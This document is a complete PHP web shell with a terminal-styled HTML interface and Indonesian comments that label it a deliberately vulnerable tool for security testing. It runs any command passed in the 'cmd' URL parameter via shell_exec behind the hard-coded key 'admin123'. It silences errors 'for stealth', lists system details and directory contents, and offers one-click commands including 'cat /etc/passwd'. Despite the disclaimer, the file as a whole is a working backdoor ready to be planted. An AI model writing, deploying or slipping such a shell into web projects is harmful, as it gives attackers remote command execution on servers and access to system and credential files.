<?php
// VULNERABLE PHP SHELL - Untuk testing keamanan
// PERINGATAN: JANGAN gunakan di lingkungan produksi!

// Disable error reporting for stealth
error_reporting(0);
ini_set('display_errors', 0);

// Simple authentication (vulnerable)
$auth_key = 'admin123'; // Weak authentication key

// Check if user is authenticated
if (isset($_GET['key']) && $_GET['key'] === $auth_key) {
    $authenticated = true;
} else {
    $authenticated = false;
}

// Get command from URL parameter
$command = isset($_GET['cmd']) ? $_GET['cmd'] : '';

// Execute command if authenticated
if ($authenticated && !empty($command)) {
    // VULNERABLE: Direct command execution
    $output = shell_exec($command);
    $return_code = $command ? 0 : 1;
} else {
    $output = '';
    $return_code = 0;
}

// Get system information
$system_info = [
    'OS' => php_uname('s'),
    'Hostname' => php_uname('n'),
    'Release' => php_uname('r'),
    'Version' => php_uname('v'),
    'Machine' => php_uname('m'),
    'PHP Version' => phpversion(),
    'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
    'Current User' => get_current_user(),
    'Current Directory' => getcwd()
];

// Get directory listing
$current_dir = getcwd();
$files = scandir($current_dir);
$file_list = [];
foreach ($files as $file) {
    if ($file !== '.' && $file !== '..') {
        $file_path = $current_dir . '/' . $file;
        $file_list[] = [
            'name' => $file,
            'type' => is_dir($file_path) ? 'Directory' : 'File',
            'size' => is_file($file_path) ? number_format(filesize($file_path)) : '-',
            'permissions' => substr(sprintf('%o', fileperms($file_path)), -4),
            'modified' => date('Y-m-d H:i:s', filemtime($file_path))
        ];
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Shell - Testing</title>
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        
        .terminal {
            background-color: #000;
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .command-input {
            background-color: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 10px;
            width: 100%;
            font-family: 'Courier New', monospace;
        }
        
        .output {
            background-color: #000;
            color: #00ff00;
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 15px;
            min-height: 100px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
        
        .warning {
            background-color: #ff6b35;
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        
        .info-box {
            background-color: #2d2d2d;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
        }
        
        .table {
            color: #00ff00;
        }
        
        .table th {
            border-color: #00ff00;
        }
        
        .table td {
            border-color: #00ff00;
        }
    </style>
</head>
<body>
    <div class="container-fluid">
        <!-- Security Warning -->
        <div class="warning">
            <h4><i class="fas fa-exclamation-triangle"></i> PERINGATAN KEAMANAN</h4>
            <p class="mb-0">File ini adalah PHP shell yang sengaja dibuat vulnerable untuk testing keamanan. JANGAN gunakan di lingkungan produksi!</p>
        </div>

        <div class="row">
            <!-- Command Execution -->
            <div class="col-md-8">
                <div class="terminal">
                    <h4><i class="fas fa-terminal"></i> Command Execution</h4>
                    
                    <?php if (!$authenticated): ?>
                        <div class="alert alert-warning">
                            <strong>Authentication Required:</strong> Add ?key=admin123 to URL to authenticate
                        </div>
                    <?php endif; ?>
                    
                    <form method="GET" class="mb-3">
                        <input type="hidden" name="key" value="<?php echo htmlspecialchars($auth_key); ?>">
                        <div class="input-group">
                            <span class="input-group-text">$</span>
                            <input type="text" 
                                   class="command-input" 
                                   name="cmd" 
                                   placeholder="Enter command (e.g., whoami, ls -la, pwd)"
                                   value="<?php echo htmlspecialchars($command); ?>">
                            <button type="submit" class="btn btn-success">
                                <i class="fas fa-play"></i> Execute
                            </button>
                        </div>
                    </form>
                    
                    <?php if ($authenticated && !empty($command)): ?>
                        <div class="info-box">
                            <strong>Command:</strong> <?php echo htmlspecialchars($command); ?><br>
                            <strong>Return Code:</strong> <?php echo $return_code; ?>
                        </div>
                        
                        <div class="output">
<?php echo htmlspecialchars($output); ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>

            <!-- System Information -->
            <div class="col-md-4">
                <div class="info-box">
                    <h5><i class="fas fa-info-circle"></i> System Information</h5>
                    <?php foreach ($system_info as $key => $value): ?>
                        <div class="mb-2">
                            <strong><?php echo htmlspecialchars($key); ?>:</strong><br>
                            <code><?php echo htmlspecialchars($value); ?></code>
                        </div>
                    <?php endforeach; ?>
                </div>

                <div class="info-box">
                    <h5><i class="fas fa-folder"></i> Current Directory</h5>
                    <code><?php echo htmlspecialchars($current_dir); ?></code>
                </div>
            </div>
        </div>

        <!-- Directory Listing -->
        <div class="row">
            <div class="col-12">
                <div class="info-box">
                    <h5><i class="fas fa-list"></i> Directory Contents</h5>
                    <div class="table-responsive">
                        <table class="table table-sm">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Type</th>
                                    <th>Size</th>
                                    <th>Permissions</th>
                                    <th>Modified</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($file_list as $file): ?>
                                    <tr>
                                        <td>
                                            <i class="fas fa-<?php echo $file['type'] === 'Directory' ? 'folder' : 'file'; ?>"></i>
                                            <?php echo htmlspecialchars($file['name']); ?>
                                        </td>
                                        <td><?php echo htmlspecialchars($file['type']); ?></td>
                                        <td><?php echo htmlspecialchars($file['size']); ?></td>
                                        <td><?php echo htmlspecialchars($file['permissions']); ?></td>
                                        <td><?php echo htmlspecialchars($file['modified']); ?></td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        <!-- Quick Commands -->
        <div class="row">
            <div class="col-12">
                <div class="info-box">
                    <h5><i class="fas fa-bolt"></i> Quick Commands</h5>
                    <div class="btn-group" role="group">
                        <a href="?key=<?php echo urlencode($auth_key); ?>&cmd=whoami" class="btn btn-outline-success btn-sm">whoami</a>
                        <a href="?key=<?php echo urlencode($auth_key); ?>&cmd=pwd" class="btn btn-outline-success btn-sm">pwd</a>
                        <a href="?key=<?php echo urlencode($auth_key); ?>&cmd=ls -la" class="btn btn-outline-success btn-sm">ls -la</a>
                        <a href="?key=<?php echo urlencode($auth_key); ?>&cmd=ps aux" class="btn btn-outline-success btn-sm">ps aux</a>
                        <a href="?key=<?php echo urlencode($auth_key); ?>&cmd=netstat -tlnp" class="btn btn-outline-success btn-sm">netstat</a>
                        <a href="?key=<?php echo urlencode($auth_key); ?>&cmd=cat /etc/passwd" class="btn btn-outline-success btn-sm">passwd</a>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center mt-4 mb-4">
            <small class="text-muted">
                <i class="fas fa-skull-crossbones"></i> 
                PHP Shell untuk testing keamanan - JANGAN gunakan di produksi!
            </small>
        </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
